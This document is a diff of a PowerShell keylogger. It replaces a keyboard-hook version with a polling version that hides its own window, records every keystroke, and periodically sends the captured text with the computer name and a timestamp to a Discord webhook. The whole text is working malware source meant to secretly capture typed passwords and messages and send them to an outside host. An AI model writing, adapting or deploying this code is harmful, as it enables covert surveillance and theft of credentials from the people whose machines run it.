@@ -1,108 +1,103 @@
-param (
-    [string]$webhook
-)
-
-if (-not $webhook) {
-    Write-Host "No webhook provided. Exiting."
-    exit
+# Check if the Webhook URL is shortened, and if it is, resolve it
+if ($dc.Ln -ne 121) {
+    Write-Host "Shortened Webhook URL Detected.."
+    $dc = (irm $dc).url
 }
 
-$pcName = $env:COMPUTERNAME  # Get PC name
-
-# Define key replacements for special keys
-$specialKeys = @{
-    "RETURN" = "[ENTER]"
-    "SPACE" = "[SPACE]"
-    "BACK" = "[BACKSPACE]"
-    "TAB" = "[TAB]"
-    "CAPITAL" = "[CAPS_LOCK]"
-    "SHIFTKEY" = "[SHIFT]"
-    "CONTROLKEY" = "[CTRL]"
-    "MENU" = "[ALT]"
-    "ESCAPE" = "[ESC]"
-    "LEFT" = "[LEFT_ARROW]"
-    "RIGHT" = "[RIGHT_ARROW]"
-    "UP" = "[UP_ARROW]"
-    "DOWN" = "[DOWN_ARROW]"
-    "DELETE" = "[DEL]"
-    "INSERT" = "[INSERT]"
-    "HOME" = "[HOME]"
-    "END" = "[END]"
-    "ADD" = "[PLUS]"
-    "SUBTRACT" = "[MINUS]"
-    "MULTIPLY" = "[STAR]"
-    "DIVIDE" = "[SLASH]"
-    "OEM_1" = "[SEMICOLON]"
-    "OEM_PLUS" = "[EQUAL]"
-    "OEM_COMMA" = "[COMMA]"
-    "OEM_MINUS" = "[DASH]"
-    "OEM_PERIOD" = "[DOT]"
-    "OEM_2" = "[FORWARD_SLASH]"
-    "OEM_3" = "[TILDE]"
-    "OEM_4" = "[LEFT_BRACKET]"
-    "OEM_5" = "[BACKSLASH]"
-    "OEM_6" = "[RIGHT_BRACKET]"
-    "OEM_7" = "[QUOTE]"
+# Hide the PowerShell window
+$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+$hwnd = (Get-Process -PID $pid).MainWindowHandle
+if ($hwnd -ne [System.IntPtr]::Zero) {
+    $Type::ShowWindowAsync($hwnd, 0)
+} else {
+    $Host.UI.RawUI.WindowTitle = 'hideme'
+    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+    $hwnd = $Proc.MainWindowHandle
+    $Type::ShowWindowAsync($hwnd, 0)
 }
 
-# Create keyboard hook
-Add-Type -TypeDefinition @"
-using System;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
-using System.Windows.Forms;
-public class KeyboardHook {
-    [DllImport("user32.dll")]
-    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);
-    [DllImport("user32.dll")]
-    private static extern bool UnhookWindowsHookEx(IntPtr hInstance);
-    [DllImport("user32.dll")]
-    private static extern IntPtr CallNextHookEx(IntPtr hHook, int nCode, IntPtr wParam, IntPtr lParam);
-    [DllImport("kernel32.dll")]
-    private static extern IntPtr GetModuleHandle(string lpModuleName);
+# Import DLL Definitions for keyboard inputs
+$API = @'
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+public static extern short GetAsyncKeyState(int virtualKeyCode); 
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int GetKeyboardState(byte[] keystate);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+'@
+$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
 
-    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-    private static LowLevelKeyboardProc _proc = HookCallback;
-    private static IntPtr _hookID = IntPtr.Zero;
+# Add stopwatch for intelligent sending
+$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
+$KeypressThreshold = [TimeSpan]::FromSeconds(10)
 
-    public static event Action<string> OnKeyPressed;
+# Initialize $send to store keypresses
+$send = ""
 
-    public static void Start() {
-        _hookID = SetHook(_proc);
-        Application.Run();
-        UnhookWindowsHookEx(_hookID);
-    }
+# Start a continuous loop
+While ($true) {
+    $keyPressed = $false
+    try {
+        # Start a loop that checks the time since last activity before the message is sent
+        while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
+            # Start the loop with 30 ms delay between keystate check
+            Start-Sleep -Milliseconds 30
+            for ($asc = 8; $asc -le 254; $asc++) {
+                # Get the key state (is any key currently pressed?)
+                $keyst = $API::GetAsyncKeyState($asc)
+                if ($keyst -eq -32767) {
+                    # Restart the inactivity timer
+                    $keyPressed = $true
+                    $LastKeypressTime.Restart()
+                    $null = [console]::CapsLock
+                    # Translate the keycode to a letter
+                    $vtkey = $API::MapVirtualKey($asc, 3)
+                    # Get the keyboard state and create stringbuilder
+                    $kbst = New-Object Byte[] 256
+                    $checkkbst = $API::GetKeyboardState($kbst)
+                    $logchar = New-Object -TypeName System.Text.StringBuilder
+                    # Define the key that was pressed          
+                    if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
+                        # Check for non-character keys
+                        $LString = $logchar.ToString()
+                        if ($asc -eq 8) { $LString = "[BKSP]" }
+                        if ($asc -eq 13) { $LString = "[ENT]" }
+                        if ($asc -eq 27) { $LString = "[ESC]" }
+                        if ($asc -eq 32) { $LString = "[Space]" }
 
-    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
-        using (Process curProcess = Process.GetCurrentProcess())
-        using (ProcessModule curModule = curProcess.MainModule) {
-            return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
+                        # Add the key to sending variable
+                        $send += $LString
+                    }
+                }
+            }
         }
     }
+    finally {
+        If ($keyPressed) {
+            # Send the saved keys to a webhook
+            $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
+            $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
+            $escmsg = $timestamp + " : " + '`' + $escmsgsys + '`'
 
-    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-        if (nCode >= 0) {
-            int vkCode = Marshal.ReadInt32(lParam);
-            string key = ((Keys)vkCode).ToString();
-            OnKeyPressed?.Invoke(key);
+            # Create the JSON payload
+            $jsonsys = @{
+                "username" = "$env:COMPUTERNAME"
+                "content"  = $escmsg
+            } | ConvertTo-Json
+
+            # Send the data to Discord webhook
+            Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
+
+            # Reset log file and inactivity check
+            $send = ""
+            $keyPressed = $false
         }
-        return CallNextHookEx(_hookID, nCode, wParam, lParam);
     }
-}
-"@ -Language CSharp
-
-# Function to send each keystroke to Discord
-function Send-KeyToDiscord {
-    param ([string]$key)
-    
-    $time = Get-Date -Format "HH:mm:ss"  # Get current time
-    $formattedKey = if ($specialKeys.ContainsKey($key)) { $specialKeys[$key] } else { $key }
-    $message = "[$pcName] - [$time] : $formattedKey"
-
-    $json = @{content=$message} | ConvertTo-Json
-    Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $json
+    # Reset stopwatch before restarting the loop
+    $LastKeypressTime.Restart()
+    Start-Sleep -Milliseconds 10
 }
 
-# Attach event to send keylogs
-[KeyboardHook]::OnKeyPressed = { param ($key) Send-KeyToDiscord $key }
-[KeyboardHook]::Start() | Out-Null
